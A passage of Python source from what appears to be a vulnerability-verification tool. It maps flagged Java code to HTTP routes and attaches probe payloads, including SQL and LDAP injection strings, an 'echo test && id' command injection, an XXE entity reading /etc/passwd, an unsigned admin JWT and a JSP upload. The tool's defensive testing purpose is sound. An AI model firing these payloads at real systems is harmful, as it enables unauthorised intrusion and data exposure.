"""
Java-specific D2 deterministic strategy helpers.
"""
import json
import logging
import re
import subprocess
import sys
from pathlib import Path
from typing import Dict, List, Optional

from .d2_types import VerificationResult


def _sanitize_label_local(text: str) -> str:
    """把标签收敛成只含安全字符的 token（供外部命令行工具使用）。"""
    return re.sub(r'[^a-zA-Z0-9._-]+', '_', text or '').strip('_') or 'target'

logger = logging.getLogger(__name__)


class D2JavaStrategiesMixin:
    def _detect_thymeleaf_ssti_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        java_files = list(project_path.rglob("*.java"))
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        selected_file = ""
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_method = "GET"
        selected_path = ""
        selected_param = ""

        for java_file in java_files:
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            if rel_path != str(vulnerability.get("file", "")) and java_file.name != Path(str(vulnerability.get("file", ""))).name:
                continue

            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")

                if idx < selected_line - 5 or idx > selected_line + 5:
                    continue

                if "process(" not in line and "parseExpression(" not in line and "th:utext" not in line:
                    continue

                route_info = self._find_route_for_line(lines, idx, request_prefix)
                if not route_info:
                    continue

                method_signature = self._find_enclosing_signature(lines, idx)
                param_name = self._extract_request_param_name(method_signature)
                if not param_name:
                    continue

                if "process(" in line:
                    process_arg = re.search(r'process\s*\(\s*([^,\)]+)', line)
                    if process_arg:
                        first_arg = process_arg.group(1).strip()
                        if first_arg.startswith('"') or first_arg.startswith("'"):
                            continue

                selected_file = rel_path
                selected_method = route_info["method"]
                selected_path = route_info["path"]
                selected_param = param_name
                break

            if selected_path:
                break

        if not selected_path or not selected_param:
            return None

        exposed_ports = self.tools._get_image_exposed_ports(selected_image)
        container_port = int(exposed_ports[0]) if exposed_ports else 8080

        return {
            "exploit_family": "java_thymeleaf_ssti",
            "image": selected_image,
            "container_port": str(container_port),
            "probe_path": "/",
            "render_path": selected_path,
            "parameter": selected_param,
            "method": selected_method,
            "payload": "${7*7}",
            "expected": "49",
            "source_file": selected_file,
            "source_line": str(selected_line),
        }

    def _detect_java_fastjson_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 6 or idx > selected_line + 6:
                    continue
                if not re.search(r'JSON\.parse(Object|Array)?\(', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_fastjson",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "method": route_info["method"],
                    "payload": '{"@type":"java.util.HashMap","a3":"49"}',
                    "expected": "49",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_sqli_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'execute(Query|Update)?\(|create(Native)?Query\(|prepareStatement\(', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "id"
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_sqli",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "baseline": "1",
                    "payload": "' OR '1'='1",
                    "expected": "",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_reflected_xss_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'getWriter\(\)\.write|getWriter\(\)\.print|@ResponseBody|ResponseEntity\.ok|addAttribute\(|return\s+[A-Za-z_][A-Za-z0-9_]*\s*;', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "q"
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_reflected_xss",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "payload": "<svg/onload=alert(1)>",
                    "expected": "<svg/onload=alert(1)>",
                            "source_file": rel_path,
                            "source_line": str(selected_line),
                        }
        return None

    def _detect_java_command_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            current_signature = self._find_enclosing_signature(lines, selected_line) if lines else ""
            method_match = re.search(r'(\w+)\s*\(', current_signature)
            method_name = method_match.group(1) if method_match else "executeCommand"

            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'ProcessBuilder\s*\(|Runtime\.getRuntime\(\)\.exec|\.exec\(', line):
                    continue
                for caller_file in project_path.rglob("*.java"):
                    caller_lines = caller_file.read_text(encoding="utf-8", errors="ignore").splitlines()
                    caller_prefix = ""
                    for caller_idx, caller_line in enumerate(caller_lines, 1):
                        if "@RequestMapping" in caller_line:
                            match = re.search(r'@RequestMapping\("([^"]+)"\)', caller_line)
                            if match:
                                caller_prefix = match.group(1).rstrip("/")
                        if method_name not in caller_line:
                            continue
                        route_info = self._find_route_for_line(caller_lines, caller_idx, caller_prefix)
                        param_name = self._extract_request_param_name(self._find_enclosing_signature(caller_lines, caller_idx)) or "command"
                        if route_info:
                            return {
                                "exploit_family": "java_command_injection",
                                "image": selected_image,
                                "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                                "target_path": route_info["path"],
                                "parameter": param_name,
                                "method": route_info["method"],
                                "payload": "echo test && id",
                                "expected": "uid=",
                                "source_file": rel_path,
                                "source_line": str(selected_line),
                            }
        return None

    def _detect_java_ssrf_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'new\s+URL\(|openConnection\(|RestTemplate\.|WebClient\.|HttpClient\.|OkHttpClient', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "url"
                if not route_info:
                    continue
                semantics = self._infer_business_semantics(
                    "java_ssrf",
                    target_path=route_info["path"],
                    parameter=param_name,
                    method=route_info["method"],
                    source_file=rel_path,
                    line_context="\n".join(lines[max(0, idx - 3):min(len(lines), idx + 3)]),
                )
                return {
                    "exploit_family": "java_ssrf",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "payload": "http://127.0.0.1:80",
                    "expected": "127.0.0.1",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                    **semantics,
                }
        return None

    def _detect_java_xxe_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                stripped = line.strip()
                if stripped.startswith("import ") or stripped.startswith("package "):
                    continue
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 12 or idx > selected_line + 12:
                    continue
                if not re.search(r'DocumentBuilderFactory|SAXBuilder|SAXReader|XMLInputFactory|SAXParserFactory|XMLStreamReader', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                signature = self._find_enclosing_signature(lines, idx)
                param_name = self._extract_request_param_name(signature) or "xml"
                transport = "body" if "@RequestBody" in signature else "param"
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_xxe",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "transport": transport,
                    "payload": xxe_payload,
                    "expected": "root:",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_xpath_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                stripped = line.strip()
                if stripped.startswith("import ") or stripped.startswith("package "):
                    continue
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'XPathFactory|XPath\.compile|XPathExpression|XPathConstants', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "name"
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_xpath",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "baseline": "guest",
                    "payload": "' or '1'='1",
                    "expected": "",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_template_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        vuln_type = str(vulnerability.get("type", ""))
        lowered_vuln_type = vuln_type.lower()
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                stripped = line.strip()
                if stripped.startswith("import ") or stripped.startswith("package "):
                    continue
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 12 or idx > selected_line + 12:
                    continue
                line_hint = line.lower()
                template_pattern = r'parseExpression|VelocityEngine|Velocity\.evaluate|Template\.process|FreeMarkerConfigurer|freemarker\.template'
                if "spel" in lowered_vuln_type:
                    template_pattern = r'parseExpression|ExpressionParser|SpelExpressionParser'
                elif "velocity" in lowered_vuln_type:
                    template_pattern = r'VelocityEngine|Velocity\.evaluate|VelocityContext'
                elif "freemarker" in lowered_vuln_type:
                    template_pattern = r'Template\.process|FreeMarkerConfigurer|freemarker\.template'
                if not re.search(template_pattern, line, re.IGNORECASE):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "name"
                if not route_info:
                    continue
                payload_info = self._pick_java_template_payload(line, vuln_type)
                family = "java_freemarker_ssti"
                poc_type = "java-freemarker-ssti"
                if "spel" in lowered_vuln_type or "parseexpression" in line_hint:
                    family = "java_spel"
                    poc_type = "java-spel"
                elif "velocity" in line_hint or "velocity" in lowered_vuln_type:
                    family = "java_velocity_ssti"
                    poc_type = "java-velocity-ssti"
                return {
                    "exploit_family": family,
                    "poc_type": poc_type,
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "render_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "payload": payload_info["payload"],
                    "expected": payload_info["expected"],
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_ognl_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'Ognl(Runtime|Context)?|Ognl\.(getValue|setValue)|ActionContext|ServletActionContext', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "expr"
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_ognl",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "payload": "%{7*7}",
                    "expected": "49",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_jndi_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'InitialContext|Context\.lookup|lookup\s*\(', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "name"
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_jndi",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "payload": "ldap://127.0.0.1:1389/a3",
                    "expected": "ldap://127.0.0.1:1389/a3",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_ldap_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'DirContext|LdapContext|search\s*\(', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "username"
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_ldap",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "baseline": "guest",
                    "payload": "*)(|(uid=*))",
                    "expected": "",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_jackson_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'ObjectMapper|readValue|enableDefaultTyping|activateDefaultTyping', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_jackson",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "method": route_info["method"],
                    "payload": '{"a3":"49","role":"admin"}',
                    "expected": "49",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_xstream_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        payload = '<map><entry><string>a3</string><string>49</string></entry></map>'
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'XStream|fromXML\s*\(', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "xml"
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_xstream",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "transport": "body",
                    "payload": payload,
                    "expected": "49",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_jwt_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 8 or idx > selected_line + 8:
                    continue
                if not re.search(r'(parseClaimsJws|parseClaimsJwt|JwtDecoder)', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "token"
                return {
                    "exploit_family": "java_jwt",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"] if route_info else "/",
                    "method": route_info["method"] if route_info else "GET",
                    "parameter": param_name,
                    "header_name": "Authorization" if "Authorization" in "\n".join(lines[max(0, idx - 10):min(len(lines), idx + 10)]) else "",
                    "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJhMyI6IjQ5In0.",
                    "expected": "admin",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                }
        return None

    def _detect_java_csp_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            content = java_file.read_text(encoding="utf-8", errors="ignore")
            if re.search(r'Content-Security-Policy|setHeader|addHeader', content):
                return {
                    "exploit_family": "java_csp",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": "/",
                    "source_file": str(java_file.relative_to(project_path)).replace("/", "\\"),
                    "source_line": str(vulnerability.get("line", 0) or 0),
                }
        return None

    def _detect_java_tomcat_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            content = java_file.read_text(encoding="utf-8", errors="ignore")
            if re.search(r'DefaultServlet|readonly|TomcatServletWebServerFactory|addContextCustomizers', content):
                return {
                    "exploit_family": "java_tomcat",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "put_path": "/a3-test.jsp",
                    "verify_path": "/a3-test.jsp",
                    "content": "<% out.print(49); %>",
                    "expected": "49",
                    "source_file": str(java_file.relative_to(project_path)).replace("/", "\\"),
                    "source_line": str(vulnerability.get("line", 0) or 0),
                }
        return None

    def _detect_java_file_upload_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 8 or idx > selected_line + 8:
                    continue
                if "transferTo" not in line and "getOriginalFilename" not in line:
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                signature = self._find_enclosing_signature(lines, idx)
                field_name = self._extract_java_multipart_name(signature) or "file"
                if not route_info:
                    continue
                return {
                    "exploit_family": "java_file_upload",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "field_name": field_name,
                    "filename": "a3-test.jsp",
                    "content": "<% out.print(49); %>",
                    "expected": "ok",
                    "source_file": rel_path,
                            "source_line": str(selected_line),
                        }
        return None

    def _find_first_java_route_in_lines(self, lines: List[str]) -> Optional[Dict[str, str]]:
        request_prefix = ""
        for idx, line in enumerate(lines, 1):
            if "@RequestMapping" in line:
                match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                if match:
                    request_prefix = match.group(1).rstrip("/")
            route_info = self._find_route_for_line(lines, idx, request_prefix)
            if route_info:
                return route_info
        return None

    def _find_first_java_route(self, project_path: Path) -> Dict[str, str]:
        for java_file in project_path.rglob("*.java"):
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            route_info = self._find_first_java_route_in_lines(lines)
            if route_info:
                return route_info
        return {"path": "/", "method": "GET"}

    def _detect_java_cors_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            content = java_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'@CrossOrigin|allowedOrigins|allowedOriginPatterns|addCorsMappings', content, re.IGNORECASE):
                continue
            route_info = self._find_first_java_route_in_lines(content.splitlines()) or self._find_first_java_route(project_path)
            return {
                "exploit_family": "java_cors",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self.tools._get_image_exposed_ports(self._select_project_image(project_path, "sast-target:latest"))[0] if self.tools._get_image_exposed_ports(self._select_project_image(project_path, "sast-target:latest")) else 8080),
                "target_path": route_info["path"],
                "method": "GET",
                "source_file": str(java_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_java_open_redirect_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'redirect:|sendRedirect\(|setHeader\(\s*["\']Location|ResponseEntity\.status\(30[12]', line, re.IGNORECASE):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "next"
                if not route_info:
                    continue
                semantics = self._infer_business_semantics(
                    "java_open_redirect",
                    target_path=route_info["path"],
                    parameter=param_name,
                    method=route_info["method"],
                    source_file=rel_path,
                    line_context="\n".join(lines[max(0, idx - 3):min(len(lines), idx + 3)]),
                )
                return {
                    "exploit_family": "java_open_redirect",
                    "image": selected_image,
                    "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                    "target_path": route_info["path"],
                    "parameter": param_name,
                    "method": route_info["method"],
                    "payload": "https://example.com/a3",
                    "expected": "https://example.com/a3",
                    "source_file": rel_path,
                    "source_line": str(selected_line),
                    **semantics,
                }
        return None

    def _detect_java_cookie_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            content = java_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'addCookie|new\s+Cookie|setSecure|setHttpOnly', content, re.IGNORECASE):
                continue
            route_info = self._find_first_java_route_in_lines(content.splitlines()) or self._find_first_java_route(project_path)
            return {
                "exploit_family": "java_cookie",
